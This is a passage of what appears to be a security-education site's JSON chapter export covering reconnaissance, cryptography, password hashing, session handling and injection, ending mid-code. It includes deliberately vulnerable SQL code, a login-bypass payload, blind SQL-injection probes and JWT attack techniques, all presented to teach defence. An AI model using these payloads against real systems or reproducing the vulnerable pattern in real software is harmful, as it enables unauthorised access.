      "body": "<h1 id=\"reconnaissance\">Reconnaissance</h1>\n<p>Reconnaissance is the first phase of every offensive engagement and the most underrated. It is also where the attacker–defender asymmetry is at its sharpest: the defender has to know everything they expose; the attacker only has to find one forgotten thing.</p>\n<p>The discipline splits into two categories that differ in <em>whether the target's logs ever see your traffic</em>.</p>\n<h2 id=\"passive-recon\">Passive recon</h2>\n<p>You learn about the target by reading sources that are already public, without ever touching the target's infrastructure. The target cannot tell you are interested.</p>\n<p>Typical sources:</p>\n<ul>\n<li><strong>DNS</strong> — public records: <code>A</code>, <code>AAAA</code>, <code>MX</code>, <code>TXT</code>, <code>NS</code>, <code>CNAME</code>. SPF/DMARC TXT records reveal which third parties send email on the domain's behalf (often disclosing CRM, marketing, support providers). DNS records change frequently and are usually answered by third-party resolvers, so your queries don't appear in the target's logs.</li>\n<li><strong>Certificate Transparency</strong> logs — every TLS cert issued by every public CA is logged in append-only logs (crt.sh, censys). Searching for <code>*.target.com</code> returns every subdomain a cert has ever been issued for, including <em>staging-12</em>, <em>legacy-admin</em>, internal acquisitions, and forgotten infrastructure. CT is one of the highest signal-to-noise OSINT sources in existence.</li>\n<li><strong>WHOIS</strong> — domain registration data (often privacy-redacted now, but historical WHOIS is still indexed).</li>\n<li><strong>ASN / IP block databases</strong> — RIPE, ARIN, APNIC tell you which IP blocks the target owns. Combined with reverse DNS, this maps the target's external footprint.</li>\n<li><strong>Shodan, Censys, ZoomEye</strong> — pre-scanned, indexed views of every IPv4 service on the internet. Search \"Apache 2.4.49\" + ASN, get every vulnerable host. The scanners scanned, not you.</li>\n<li><strong>Source code leaks</strong> — GitHub, Pastebin, public S3 buckets. Internal hostnames, API keys, JWT secrets, AWS credentials accidentally pushed. Tools like <code>truffleHog</code>, <code>gitleaks</code>, GitHub's secret scanning, and Google dorks find them.</li>\n<li><strong>Wayback Machine</strong> — historical snapshots of the site. URLs deprecated months ago may still be reachable on the live infrastructure (orphaned endpoints).</li>\n<li><strong>People</strong> — LinkedIn (org chart, tech stack mentioned in job descriptions), conference talks (architecture details), employee social posts (laptop stickers, photos of conference rooms with whiteboards).</li>\n<li><strong>Breach corpora</strong> — HaveIBeenPwned, COMB. Reuse of leaked passwords is the single most reliable initial-access vector.</li>\n</ul>\n<p>The defender cannot remove most of this — it lives in third-party systems. The defender's only move is to know what is out there and constrain the damage.</p>\n<h2 id=\"active-recon\">Active recon</h2>\n<p>You send traffic to the target itself. The target's logs will record this; high-noise actions (port scans, vulnerability scans) trip alerts and often legal trouble.</p>\n<p>Typical actions:</p>\n<ul>\n<li><strong>Port scanning</strong> — TCP SYN scans (half-open, low-overhead), full connect scans, UDP scans (slow because of ICMP rate-limiting on closed ports). Identifies open services. The most basic and most noisy step.</li>\n<li><strong>Service / version detection</strong> — banners and protocol fingerprinting tell you exactly what software is running. Versions map directly to CVE databases.</li>\n<li><strong>Vulnerability scanning</strong> — automated probes (Nessus, OpenVAS, Nuclei). Loud, high false-positive rate, useful as a <em>first sweep</em> before manual analysis.</li>\n<li><strong>Web application crawling</strong> — link discovery, hidden parameter discovery (<code>arjun</code>), directory brute-forcing (<code>ffuf</code>, <code>gobuster</code>). Active because every probe is a request the application sees.</li>\n<li><strong>Subdomain brute force / permutation</strong> — try every word from a wordlist as a subdomain. Complementary to passive CT mining: catches subdomains that never got a public certificate.</li>\n<li><strong>OS fingerprinting</strong> — TCP/IP stack quirks (window size, options, TTL) identify the OS without authenticating.</li>\n</ul>\n<p>Active recon is a trade-off: more information, more exposure. Engagements with NDA / authorisation balance that explicitly; unauthorised active recon against a third party is in most jurisdictions illegal.</p>\n<h2 id=\"why-recon-is-asymmetric\">Why recon is asymmetric</h2>\n<p>The defender has to enumerate, harden, and monitor <em>every</em> asset they own. The attacker only needs <em>one</em> asset that the defender failed to enumerate, hardened, or monitored. Concrete examples of the asymmetry:</p>\n<ul>\n<li>An acquisition the security team hasn't been notified about yet.</li>\n<li>A development environment spun up \"for the demo\" and never decommissioned.</li>\n<li>A subdomain belonging to a former vendor's tenant, where DNS still points to a CNAME the vendor has freed (subdomain takeover).</li>\n<li>A staging database with prod data, exposed on an internal range that became public after a router config change.</li>\n<li>A backup AWS account opened by a team lead who left the company.</li>\n</ul>\n<p>The attacker's recon finds these <em>first</em>. The defender's \"asset inventory\" is always lagging reality. This is why <strong>continuous external attack-surface monitoring</strong> (running the attacker's recon against yourself, every day, and acting on the diff) has become a discipline of its own.</p>\n<h2 id=\"the-funnel\">The funnel</h2>\n<p>Mature recon converges from broad to narrow:</p>\n<pre><code>Domains and IP blocks           (footprinting)\n    ↓\nSubdomains and hostnames        (asset discovery)\n    ↓\nOpen ports and services         (service identification)\n    ↓\nSoftware versions               (fingerprinting)\n    ↓\nKnown CVEs + misconfigurations  (vulnerability mapping)\n    ↓\nExploitable paths               (analysis + manual testing)\n</code></pre>\n<p>Each stage filters the surface; each stage uses the output of the one above. Skipping a stage means going straight to exploitation against a target you don't actually understand — which is how engagements miss the easy wins and end up exploiting hard things that don't matter.</p>\n<h2 id=\"a-note-on-intent\">A note on intent</h2>\n<p>The same techniques and the same tools serve red team, blue team (knowing your own surface), bug bounty (authorised testing), and threat intelligence (watching an adversary). The technical content is identical; the <em>authorisation</em> and <em>scope</em> are what separate research from a crime. Every offensive practitioner has to internalise that distinction before they touch a target system.</p>",
      "tag": "THEORY · CHAPTER"
    },
    {
      "title": "Cryptography — Symmetric Encryption",
      "slug": "cryptography-symmetric-encryption",
      "date": "2026·06·04",
      "tags": [
        "fundamentals",
        "cryptography",
        "aes",
        "theory"
      ],
      "desc": "In symmetric cryptography the same key both encrypts (P → C) and decrypts (C → P). It is fast and well understood; the entire challenge is getting the key to the other party without anyone else seeing it.",
      "body": "<h1 id=\"symmetric-encryption\">Symmetric Encryption</h1>\n<p>In symmetric cryptography the same key both encrypts (<strong>P → C</strong>) and decrypts (<strong>C → P</strong>). It is fast and well understood; the entire challenge is <em>getting the key to the other party without anyone else seeing it</em>.</p>\n<h2 id=\"two-families\">Two families</h2>\n<ul>\n<li><strong>Stream ciphers</strong> generate a pseudo-random keystream and XOR it into the plaintext one byte at a time. Conceptually identical to a one-time pad, except the keystream is generated, not pre-shared. Fast in software, sensitive to nonce reuse (reuse the same keystream twice and an attacker recovers <code>P1 XOR P2</code>).</li>\n<li><strong>Block ciphers</strong> operate on fixed-size blocks (AES = 128 bits). To encrypt a longer message you need a <em>mode of operation</em>.</li>\n</ul>\n<h2 id=\"aes-briefly\">AES, briefly</h2>\n<p>AES (Advanced Encryption Standard) replaced DES in 2001. It performs a fixed number of <em>rounds</em> (10/12/14 for 128/192/256-bit keys) of:</p>\n<ul>\n<li>byte substitution through a non-linear S-box (confusion),</li>\n<li>row/column shuffling (diffusion),</li>\n<li>XOR with a round-derived key.</li>\n</ul>\n<p>It is a primitive — secure only when used with the right mode.</p>\n<h2 id=\"modes-of-operation-the-part-people-get-wrong\">Modes of operation // the part people get wrong</h2>\n<p>The mode dictates how the cipher's single-block output is combined with the rest of the message. The mode, not AES, is what gets attacked in the wild.</p>\n<h3 id=\"ecb-electronic-codebook\">ECB // Electronic Codebook</h3>\n<p>Each block is encrypted independently. Two identical plaintext blocks produce two identical ciphertext blocks, leaking structure:</p>\n<pre><code>P1 → AES_k → C1\nP2 → AES_k → C2     (if P1 == P2, then C1 == C2)\n</code></pre>\n<p>The famous \"ECB penguin\" image is a direct demonstration: outlines of the picture remain visible after encryption. <strong>Never use ECB for anything that has repeated structure</strong> (which is almost everything).</p>\n<h3 id=\"cbc-cipher-block-chaining\">CBC // Cipher Block Chaining</h3>\n<p>Each plaintext block is XORed with the <em>previous ciphertext block</em> before encryption. A random IV seeds the first block. This kills structural leakage and is widely deployed — but the IV must be unpredictable, and CBC needs separate authentication. Used naked, CBC is vulnerable to <em>padding oracle</em> attacks (POODLE, Lucky13) — an oracle that reveals whether decryption produced valid PKCS#7 padding leaks the plaintext one byte at a time.</p>\n<h3 id=\"ctr-counter\">CTR // Counter</h3>\n<p>Turns the block cipher into a stream cipher: encrypt a counter, XOR the output with plaintext. Random access, parallelisable, no padding needed. Catastrophic if you ever reuse the (key, counter) pair — same keystream, same attack as a stream cipher.</p>\n<h3 id=\"gcm-galoiscounter-mode\">GCM // Galois/Counter Mode</h3>\n<p>CTR + a Galois-field MAC computed over the ciphertext and associated data. Provides <strong>confidentiality and integrity in one pass</strong> — the modern default. TLS 1.3 mandates AEAD modes like GCM and ChaCha20-Poly1305 precisely because separating \"encrypt\" from \"authenticate\" is where most real-world flaws live.</p>\n<h2 id=\"the-two-universal-rules\">The two universal rules</h2>\n<ol>\n<li><strong>Never roll your own primitive.</strong> Use a vetted library that exposes AEAD (AES-GCM, ChaCha20-Poly1305) rather than raw AES.</li>\n<li><strong>Encryption is not authentication.</strong> A ciphertext that has not been authenticated can be modified by an attacker. AEAD modes solve this; raw CBC/CTR do not.</li>\n</ol>\n<h2 id=\"key-management-is-the-hard-part\">Key management is the hard part</h2>\n<p>Algorithm choice is almost never the weak link. The weak links are:</p>\n<ul>\n<li>distributing the shared key without an out-of-band channel (which is <em>the</em> problem asymmetric crypto exists to solve);</li>\n<li>storing keys safely (HSMs, OS keychains, KMS — not plaintext files);</li>\n<li>rotating keys when staff or systems change;</li>\n<li>destroying old keys after data is re-encrypted.</li>\n</ul>\n<p>A perfect AES-256 deployment with the key sitting in a <code>.env</code> file checked into git provides zero confidentiality.</p>\n<h2 id=\"a-note-on-terminology\">A note on terminology</h2>\n<ul>\n<li><strong>Encryption</strong> ≠ <strong>encoding</strong>. Base64, hex, URL-encoding are <em>encodings</em> — anyone can reverse them. There is no key.</li>\n<li><strong>Encryption</strong> ≠ <strong>hashing</strong>. Hashing is one-way and irreversible; encryption is reversible by design.</li>\n</ul>\n<p>Mislabelling these is one of the most common errors in informal security writing.</p>",
      "tag": "THEORY · CHAPTER"
    },
    {
      "title": "Cryptography — Asymmetric Encryption",
      "slug": "cryptography-asymmetric-encryption",
      "date": "2026·06·04",
      "tags": [
        "fundamentals",
        "cryptography",
        "rsa",
        "pgp",
        "theory"
      ],
      "desc": "Symmetric crypto needs both sides to already share a secret key — which is a chicken-and-egg problem on the open internet. Asymmetric (public-key) cryptography solves it: each party generates a key pair — a public key everyone can see and a private key only they know. What one…",
      "body": "<h1 id=\"asymmetric-encryption\">Asymmetric Encryption</h1>\n<p>Symmetric crypto needs both sides to already share a secret key — which is a chicken-and-egg problem on the open internet. <strong>Asymmetric (public-key) cryptography</strong> solves it: each party generates a <em>key pair</em> — a public key everyone can see and a private key only they know. What one key locks, the other unlocks.</p>\n<p>Two operations matter:</p>\n<ul>\n<li><strong>Encrypt with the public key → decrypt with the private key.</strong> Anyone can send a confidential message to the holder of the private key.</li>\n<li><strong>Sign with the private key → verify with the public key.</strong> Only the holder of the private key can produce signatures; anyone can verify them. This proves authenticity and integrity.</li>\n</ul>\n<p>Asymmetric algorithms are slow (often 100–1000× slower than AES). In practice they are used to <em>bootstrap</em> a symmetric session key, which then carries the bulk traffic. This is exactly what TLS does in the handshake.</p>\n<h2 id=\"rsa-the-canonical-example\">RSA // the canonical example</h2>\n<p>RSA's security rests on the difficulty of factoring large composite numbers. Key generation:</p>\n<ol>\n<li>Pick two large primes <code>p</code> and <code>q</code> (each at least 1024 bits for legacy use, 2048+ today).</li>\n<li>Compute <code>n = p · q</code>. This <code>n</code> is the <em>modulus</em> — half of both keys.</li>\n<li>Compute Euler's totient <code>φ(n) = (p−1)(q−1)</code>.</li>\n<li>Pick a public exponent <code>e</code> coprime with <code>φ(n)</code> (usually 65537).</li>\n<li>Compute <code>d</code> such that <code>e · d ≡ 1 (mod φ(n))</code> — the private exponent.</li>\n</ol>\n<p>Result:</p>\n<ul>\n<li><strong>Public key</strong>: <code>(n, e)</code></li>\n<li><strong>Private key</strong>: <code>(n, d)</code></li>\n</ul>\n<p>Encryption of a message <code>m</code> (as an integer &lt; n): <code>c = m^e mod n</code>.\nDecryption: <code>m = c^d mod n</code>.</p>\n<p>Why it works: by Euler's theorem, <code>m^(e·d) ≡ m (mod n)</code> whenever <code>gcd(m, n) = 1</code>.</p>\n<p>Why it's secure: recovering <code>d</code> from the public key requires factoring <code>n</code> into <code>p · q</code>. With 2048-bit <code>n</code>, no classical algorithm can do this in reasonable time. (A sufficiently large quantum computer running Shor's algorithm could — hence the push toward post-quantum cryptography.)</p>\n<h3 id=\"rsa-pitfalls\">RSA pitfalls</h3>\n<ul>\n<li><strong>Textbook RSA is broken.</strong> Without proper padding (OAEP), it leaks structure and is malleable. Always use a vetted implementation.</li>\n<li><strong>Small <code>e</code> + no padding</strong> lets attackers recover small plaintexts directly (cube root attack when <code>e = 3</code>).</li>\n<li><strong>Reused <code>n</code> across users</strong> with different <code>e</code> allows common-modulus attacks.</li>\n<li><strong>Low entropy primes</strong> allow batch GCD to factor multiple keys at once — historically caused mass key compromise in IoT and embedded TLS.</li>\n</ul>\n<h2 id=\"elliptic-curve-cryptography-ecc\">Elliptic-curve cryptography (ECC)</h2>\n<p>ECC achieves the same security as RSA with much shorter keys (a 256-bit ECC key ≈ 3072-bit RSA). The hard problem here is the <em>elliptic-curve discrete log</em> — given points <code>G</code> and <code>Q = k·G</code> on a curve, recover <code>k</code>. Modern protocols (Signal, WireGuard, TLS 1.3) lean on Curve25519 and Ed25519, which are designed to avoid the implementation traps that plagued NIST curves.</p>\n<h2 id=\"hybrid-encryption-the-real-world-pattern\">Hybrid encryption // the real-world pattern</h2>\n<pre><code>Alice generates a one-shot AES key K.\nAlice encrypts message M:        ciphertext = AES_K(M)\nAlice encrypts K with Bob's pub: wrapped_key = RSA_pub(K)\nAlice sends: (wrapped_key, ciphertext)\n\nBob decrypts wrapped_key with his private RSA key, recovers K,\nthen decrypts the ciphertext with AES.\n</code></pre>\n<p>Every secure email standard (S/MIME, PGP), every TLS handshake, every encrypted disk implementation uses this pattern. Asymmetric crypto carries the key, symmetric crypto carries the data.</p>\n<h2 id=\"digital-signatures\">Digital signatures</h2>\n<p>Signing inverts the key roles:</p>\n<pre><code>sig = Sign_priv(SHA-256(message))\nverify = Verify_pub(message, sig)\n</code></pre>\n<p>The signer hashes the message first, then encrypts the hash with their private key. Anyone with the public key recomputes the hash and decrypts the signature; a match proves both authenticity (only the holder of the private key could have produced it) and integrity (any change to the message breaks the hash match). This is how software updates, code signing, JWTs (RS256/ES256), and certificate chains all work.</p>\n<h2 id=\"pgp-gpg\">PGP / GPG</h2>\n<p><strong>PGP</strong> (Pretty Good Privacy) is the original ecosystem: every user owns a long-lived key pair, exchanges public keys with peers, and uses them for both encryption and signing of email and files.</p>\n<p><strong>GPG</strong> (GNU Privacy Guard) is the open-source implementation. Private keys are themselves protected by a passphrase — when an offline copy of a PGP private key leaks, the attacker still has to crack the passphrase before they can use the key. This is what tools like <code>gpg2john</code> + a wordlist attacker target.</p>\n<p>PGP's web-of-trust model (no central CA — users sign each other's keys) is more robust philosophically than TLS's CA model, but operationally heavy, which is why TLS won the public internet and PGP remains niche.</p>",
      "tag": "THEORY · CHAPTER"
    },
    {
      "title": "Hashing & Password Storage",
      "slug": "hashing-password-storage",
      "date": "2026·06·04",
      "tags": [
        "fundamentals",
        "cryptography",
        "hashing",
        "passwords",
        "theory"
      ],
      "desc": "A cryptographic hash function takes an arbitrary-length input and produces a fixed-length output (the digest). It is one-way: easy to compute H(x), computationally infeasible to recover x from it. This single property powers integrity checks, password storage, commitment…",
      "body": "<h1 id=\"hashing-password-storage\">Hashing &amp; Password Storage</h1>\n<p>A cryptographic hash function takes an arbitrary-length input and produces a fixed-length output (the <em>digest</em>). It is one-way: easy to compute <code>H(x)</code>, computationally infeasible to recover <code>x</code> from it. This single property powers integrity checks, password storage, commitment schemes, blockchain, and content-addressing.</p>\n<h2 id=\"what-makes-a-hash-cryptographic\">What makes a hash \"cryptographic\"</h2>\n<p>Three properties:</p>\n<ol>\n<li><strong>Pre-image resistance</strong> — given <code>h</code>, infeasible to find any <code>x</code> such that <code>H(x) = h</code>.</li>\n<li><strong>Second pre-image resistance</strong> — given <code>x</code>, infeasible to find a different <code>x'</code> with <code>H(x') = H(x)</code>.</li>\n<li><strong>Collision resistance</strong> — infeasible to find <em>any</em> pair <code>(x, x')</code> with <code>H(x) = H(x')</code>.</li>\n</ol>\n<p>When a hash function loses one of these, it dies a slow death:</p>\n<ul>\n<li><strong>MD5</strong> — collisions found in 2004, now trivial to construct. Dead for everything except non-security checksums.</li>\n<li><strong>SHA-1</strong> — collisions demonstrated (SHAttered, 2017). Removed from TLS, git is still phasing it out.</li>\n<li><strong>SHA-2</strong> family (SHA-256, SHA-512) — current default.</li>\n<li><strong>SHA-3</strong> family (Keccak) — designed as a <em>structurally different</em> backup in case SHA-2 ever falls.</li>\n</ul>\n<h2 id=\"collisions-are-unavoidable-in-theory\">Collisions are unavoidable in theory</h2>\n<p>A hash function maps an infinite domain to a finite range, so by the pigeonhole principle collisions must exist. The whole game is making them <em>unreachable</em> in practice. The birthday bound says you expect a collision after roughly <code>2^(n/2)</code> trials for an <code>n</code>-bit digest — which is why 128-bit hashes (MD5) are too small even when the function is unbroken.</p>\n<h2 id=\"integrity-checks\">Integrity checks</h2>\n<p>The most common everyday use:</p>\n<pre><code>Download:  file.iso + sha256.txt\nRecompute: H(file.iso)\nIf H(file.iso) == sha256.txt → file unmodified\n</code></pre>\n<p>The hash must arrive over an <em>integrity-protected</em> channel (HTTPS, signature, separate trusted source). A file <em>and</em> its hash hosted on the same compromised mirror buy you nothing.</p>\n<h2 id=\"hashing-vs-encryption-the-line-people-blur\">Hashing vs encryption // the line people blur</h2>\n<ul>\n<li><strong>Encryption</strong> is reversible <em>with the key</em>. AES with the key gets you back the plaintext.</li>\n<li><strong>Hashing</strong> is irreversible <em>by design</em>. Even the original author cannot \"decrypt\" <code>sha256(x)</code>.</li>\n</ul>\n<p>A password store that \"encrypts\" passwords is a misdesign: it implies decryption is possible, which means a server breach trivially recovers every password. Passwords must be <em>hashed</em>.</p>\n<h2 id=\"password-hashing-a-different-problem\">Password hashing // a different problem</h2>\n<p>Generic hash functions (SHA-256) are <em>too fast</em> for passwords. An attacker with a modern GPU can compute billions of SHA-256s per second; a user has at most a hundred bits of entropy in even a strong passphrase. Speed favours the attacker.</p>\n<p>The fix is a <strong>password-hashing function</strong> designed to be <em>slow</em> and <em>memory-hard</em>:</p>\n<ul>\n<li><strong>bcrypt</strong> — proven, cost-adjustable, used everywhere. Limited input to 72 bytes.</li>\n<li><strong>scrypt</strong> — bcrypt + tunable memory cost (defeats GPU/ASIC advantage).</li>\n<li><strong>argon2id</strong> — winner of the 2015 Password Hashing Competition. Current best-practice default.</li>\n<li><strong>PBKDF2</strong> — older standard; acceptable but no memory hardness. Use only when required by compliance.</li>\n</ul>\n<p>A modern stored password record looks like:</p>\n<pre><code>$argon2id$v=19$m=65536,t=3,p=4$&lt;salt&gt;$&lt;digest&gt;\n</code></pre>\n<p>Self-describing: algorithm, version, memory, time, parallelism, salt, digest. Verification rehashes the supplied password with the same parameters and constant-time-compares.</p>\n<h2 id=\"salt\">Salt</h2>\n<p>A <strong>salt</strong> is a random value (≥ 16 bytes) concatenated to the password before hashing, then stored alongside the digest. Two reasons:</p>\n<ul>\n<li><strong>Defeat rainbow tables.</strong> A rainbow table is a precomputed map from hash → password. A unique salt per user means an attacker must build a new table per user — economically pointless.</li>\n<li><strong>Hide duplicate passwords.</strong> Without salt, two users with the same password get identical digests, leaking statistics.</li>\n</ul>\n<p>The salt is <em>not</em> a secret. It just has to be unique per password.</p>\n<h2 id=\"pepper-optional\">Pepper (optional)</h2>\n<p>A <strong>pepper</strong> is a server-side secret added to every password before hashing (not stored in the DB). If the DB leaks but the application code does not, the attacker cannot compute candidate hashes. Useful, but it adds operational complexity and key rotation pain.</p>\n<h2 id=\"what-leaked-hashes-means-in-practice\">What \"leaked hashes\" means in practice</h2>\n<p>When a breach dumps <code>users.sql</code>, the attacker now runs an offline cracking job:</p>\n<ul>\n<li><strong>Dictionary attack</strong> — try a curated word list (rockyou.txt + permutations).</li>\n<li><strong>Rule-based attack</strong> — apply transformation rules (<code>Password1</code> → <code>P@ssw0rd!</code>).</li>\n<li><strong>Mask attack</strong> — brute-force a known structure (<code>?u?l?l?l?d?d?s</code> = uppercase, three lower, two digits, symbol).</li>\n<li><strong>Hybrid</strong> — combine wordlist with mask suffix.</li>\n</ul>\n<p>Tools like Hashcat and John the Ripper automate this; modern GPUs do tens of GH/s on fast hashes (SHA-256), but only thousands of H/s on argon2id. The choice of password hash function determines whether a breach is a five-minute exercise or a five-year one.</p>\n<h2 id=\"identifying-a-hash-in-the-wild\">Identifying a hash in the wild</h2>\n<p>Unix <code>/etc/shadow</code> entries are self-describing:</p>\n<pre><code>$1$  → MD5-crypt   (do not use)\n$2y$ → bcrypt\n$5$  → SHA-256 crypt\n$6$  → SHA-512 crypt\n$y$  → yescrypt\n</code></pre>\n<p>Windows uses <strong>NTLM</strong> (an unsalted MD4 of UTF-16 password) — historically fast to crack, which is why credential dumping is so devastating on Windows. The hashes live in the SAM database, exposed at runtime in LSASS — protected only by an OS-level access control list.</p>",
      "tag": "THEORY · CHAPTER"
    },
    {
      "title": "Authentication & Sessions",
      "slug": "authentication-sessions",
      "date": "2026·06·04",
      "tags": [
        "fundamentals",
        "authentication",
        "sessions",
        "jwt",
        "theory"
      ],
      "desc": "Authentication answers \"who is this request from?\". Sessions answer \"and we already authenticated this conversation a moment ago, so let's not do the expensive work again\". Almost every web vulnerability above the network layer lives at the seam between those two questions.",
      "body": "<h1 id=\"authentication-sessions\">Authentication &amp; Sessions</h1>\n<p>Authentication answers \"<em>who is this request from?</em>\". Sessions answer \"<em>and we already authenticated this conversation a moment ago, so let's not do the expensive work again</em>\". Almost every web vulnerability above the network layer lives at the seam between those two questions.</p>\n<h2 id=\"the-three-factors\">The three factors</h2>\n<p>A <em>factor</em> is a category of authenticator. Strong authentication uses two or more from different categories:</p>\n<ul>\n<li><strong>Something you know</strong> — password, PIN, security questions. Easy to steal in bulk.</li>\n<li><strong>Something you have</strong> — TOTP authenticator app, hardware token (YubiKey, FIDO2), SMS code (weak — SIM-swappable).</li>\n<li><strong>Something you are</strong> — biometrics (fingerprint, face, voice). Hard to revoke when compromised.</li>\n</ul>\n<p><strong>MFA</strong> (Multi-Factor Authentication) requires factors from <em>different categories</em>. Two passwords are not MFA; password + TOTP is. Two of the same category buy you very little (a password and a security question are both \"something you know\").</p>\n<p>The current best practice is a passwordless WebAuthn / FIDO2 login backed by a hardware key — it cannot be phished because the protocol binds the assertion to the origin.</p>\n<h2 id=\"sessions-the-two-architectures\">Sessions // the two architectures</h2>\n<p>After authentication, the server must remember the user across subsequent requests without asking for the password each time. There are two ways to do it, and the security trade-offs are completely different.</p>\n<h3 id=\"server-side-sessions\">Server-side sessions</h3>\n<p>The server generates a random opaque ID, stores <code>session_id → {user, expiry, claims}</code> in a backing store (Redis, DB), and sends the ID to the client as a cookie:</p>\n<pre><code>Set-Cookie: sessionid=8c2f...; HttpOnly; Secure; SameSite=Strict\n</code></pre>\n<p>On every request the server looks up the ID in its store. <strong>All authority lives server-side.</strong> Logout = delete the row. Revocation = trivial.</p>\n<h3 id=\"tokens-jwt-and-friends\">Tokens (JWT and friends)</h3>\n<p>The server signs a self-describing token and gives it to the client. The token <em>contains</em> the claims and a signature; on every request the server validates the signature and trusts the claims:</p>\n<pre><code>header.payload.signature\n  ↓       ↓        ↓\n{alg}  {sub,    HMAC_secret(header + &quot;.&quot; + payload)\n       exp,\n       roles}\n</code></pre>\n<p><strong>All authority lives in the token.</strong> The server is stateless. Revocation is hard — you cannot un-issue a signed token until it expires, so you need a denylist (which… defeats statelessness) or short token lifetimes + refresh.</p>\n<p>JWT pitfalls in the wild:</p>\n<ul>\n<li><strong><code>alg: none</code></strong> — older libraries accepted unsigned tokens. Fixed in spec, still present in legacy code.</li>\n<li><strong><code>alg: HS256</code> / RS256 confusion</strong> — server expects RSA, attacker submits an HS256 token with the <em>public key</em> as the HMAC secret. Library validates \"successfully\".</li>\n<li><strong>Weak HMAC secret</strong> — <code>secret</code>, <code>password123</code>. Offline brute force recovers the secret in seconds.</li>\n<li><strong>No expiry / very long expiry</strong> — stolen token works forever.</li>\n<li><strong>Trusting <code>kid</code>, <code>jku</code>, <code>x5u</code> headers</strong> without strict validation — attacker controls key lookup.</li>\n</ul>\n<p>The rule of thumb: <strong>prefer server-side sessions unless you have a concrete need for statelessness</strong> (multi-region, very high QPS, third-party API). Most apps do not.</p>\n<h2 id=\"cookie-hygiene\">Cookie hygiene</h2>\n<p>Whichever session model you pick, the cookie carrying the credential must be configured:</p>\n<ul>\n<li><strong><code>HttpOnly</code></strong> — not readable from JavaScript (defeats trivial XSS theft).</li>\n<li><strong><code>Secure</code></strong> — only sent over HTTPS.</li>\n<li><strong><code>SameSite=Lax|Strict</code></strong> — not sent on cross-site requests (defeats most CSRF).</li>\n<li><strong><code>Path</code> / <code>Domain</code></strong> — scoped as tightly as possible.</li>\n<li><strong>Short expiry</strong> + sliding renewal.</li>\n</ul>\n<p>Missing any one of these turns a small bug into a session hijack.</p>\n<h2 id=\"authentication-attacks-the-classes\">Authentication attacks // the classes</h2>\n<ul>\n<li><strong>Credential stuffing</strong> — try password dumps from other breaches against your login. Defence: rate-limit per IP <em>and</em> per account, breach-corpus check at registration (HIBP).</li>\n<li><strong>Password spraying</strong> — try one weak password across many accounts (avoids per-account lockouts). Defence: per-IP rate limits, anomaly detection.</li>\n<li><strong>Username enumeration</strong> — login form responds \"user not found\" vs \"wrong password\", or with different timing. Defence: identical response and constant time for both failure modes.</li>\n<li><strong>Session fixation</strong> — attacker plants a known session ID in the victim's browser before login; if the server doesn't rotate the ID on login, the attacker keeps the now-authenticated session. Defence: always issue a <em>new</em> session ID upon successful login.</li>\n<li><strong>Logout failures</strong> — server keeps the token valid after logout, or only clears the cookie client-side. Defence: invalidate server-side state on logout.</li>\n</ul>\n<h2 id=\"a-short-note-on-oauth\">A short note on OAuth</h2>\n<p>OAuth is <strong>delegated authorization</strong>, not authentication. \"Sign in with Google\" works because OpenID Connect was bolted on top of OAuth specifically to extract an <em>identity</em> assertion. Confusing the two leads to the classic \"use the access token as if it were proof of identity\" bug — the token only proves the user authorised your app to call Google's API on their behalf, not that the user is actually present <em>right now</em>.</p>",
      "tag": "THEORY · CHAPTER"
    },
    {
      "title": "Web — Injection",
      "slug": "web-injection",
      "date": "2026·06·04",
      "tags": [
        "fundamentals",
        "web",
        "sqli",
        "command-injection",
        "theory"
      ],
      "desc": "Every injection vulnerability — SQL, command, LDAP, NoSQL, template, JNDI — shares one root cause: user-supplied data is interpreted as code instead of as data. The application takes input that should be a value and lets it become part of a grammar that an interpreter then…",
      "body": "<h1 id=\"injection-the-inputcontext-mismatch\">Injection // The Input/Context Mismatch</h1>\n<p>Every injection vulnerability — SQL, command, LDAP, NoSQL, template, JNDI — shares one root cause: <strong>user-supplied data is interpreted as code instead of as data</strong>. The application takes input that should be a <em>value</em> and lets it become part of a <em>grammar</em> that an interpreter then executes.</p>\n<p>If you understand that single sentence, you understand injection.</p>\n<h2 id=\"the-general-shape\">The general shape</h2>\n<pre><code>user input ──┐\n             ├──→ string concat ──→ interpreter ──→ side effects\nprogram code ┘\n</code></pre>\n<p>The interpreter (SQL engine, shell, LDAP server, template engine) sees a single program text and parses it according to its grammar. It has no idea which characters originated from the developer and which from the attacker — only that they all parse as a valid program. The attacker wins by writing input that <em>survives</em> the parsing as syntax rather than as a literal.</p>\n<p>The fix is always the same in principle: <strong>separate code from data at the API level</strong>. Make it physically impossible for input to be parsed as syntax.</p>\n<h2 id=\"sql-injection\">SQL Injection</h2>\n<p>A vulnerable login:</p>\n<pre><code class=\"language-python\">q = &quot;SELECT * FROM users WHERE name = '&quot; + name + &quot;' AND pw = '&quot; + pw + &quot;'&quot;\ndb.execute(q)\n</code></pre>\n<p>The developer intended <code>name</code> and <code>pw</code> to be quoted literals. Supplying <code>name = admin' --</code> produces:</p>\n<pre><code class=\"language-sql\">SELECT * FROM users WHERE name = 'admin' --' AND pw = '...'\n</code></pre>\n<p>The <code>--</code> starts an SQL line comment; the password check is now commented out. The attacker hasn't escaped a sandbox — the sandbox never existed. The query they sent was always going to be parsed as a complete SQL statement.</p>\n<h3 id=\"three-flavours\">Three flavours</h3>\n<ul>\n<li><strong>In-band (classic)</strong> — query result returns in the HTTP response. UNION-based extraction joins the attacker's <code>SELECT</code> onto the legitimate one to dump arbitrary tables.</li>\n<li><strong>Blind boolean-based</strong> — no result rendered, but page behaviour differs based on a condition. The attacker asks yes/no questions one bit at a time (<code>AND SUBSTR(password,1,1)='a'</code>).</li>\n<li><strong>Blind time-based</strong> — page is identical; only the <em>response time</em> differs. <code>IF(condition, SLEEP(5), 0)</code> reveals each bit by latency.</li>\n</ul>\n<h3 id=\"why-stripping-quotes-doesnt-work\">Why \"stripping quotes\" doesn't work</h3>\n<p>Filters that escape <code>'</code> or strip <code>--</code> are bypassed by encoding (<code>%27</code>), comments inside keywords (<code>UN/**/ION</code>), case mixing, double encoding, alternative syntax (<code>UNION ALL</code>, <code>0x</code> literals), second-order injection (input is stored cleanly, used dirty later). The only fix is <strong>parameterised queries / prepared statements</strong>:</p>\n<pre><code class=\"language-python\">db.execute(&quot;SELECT * FROM users WHERE name = ? AND pw = ?&quot;, [name, pw])\n</code></pre>\n<p>The driver sends the query text <em>and</em> the parameters <em>separately</em> over the wire. The database never concatenates them into a single string; the parameters cannot become syntax no matter what they contain.</p>\n<h2 id=\"command-injection\">Command Injection</h2>\n<p>The same pattern, with the shell as the interpreter:</p>\n<pre><code class=\"language-python\">os.system(&quot;ping -c 1 &quot; + 